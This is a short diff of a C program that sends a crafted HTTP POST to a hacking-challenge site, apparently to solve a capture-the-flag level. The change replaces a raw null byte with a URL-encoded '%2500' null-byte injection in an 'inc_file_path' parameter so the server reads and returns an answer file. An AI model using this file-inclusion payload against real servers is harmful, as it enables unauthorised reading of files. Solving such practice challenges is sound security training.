@@ -43,10 +43,10 @@ int main(){
 	fputs("Host: www.hackerschool.jp\r\n",f);
 	fputs("Connection: close\r\n",f);
 	fputs("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n",f);
-	fprintf(f,"Content-Length: %d\r\n",strlen("inc_file_path=take38_answer.php")+1);
+	fprintf(f,"Content-Length: %d\r\n",strlen("inc_file_path=take38_answer.php%2500"));
 	fputs("\r\n",f);
-	fwrite("inc_file_path=take38_answer.php\0",1,strlen("inc_file_path=take38_answer.php")+1,f);
-	while(myfgets(z,9999,f)&&*z)puts(z); //strip header
-	while(myfgets(z,9999,f)&&memcmp(z,"<GET> ",6))puts(z);
+	fputs("inc_file_path=take38_answer.php%2500",f); //escape("%00")
+	while(myfgets(z,9999,f)&&*z);//puts(z); //strip header
+	while(myfgets(z,9999,f))puts(z);
 	fclose(f);
 }
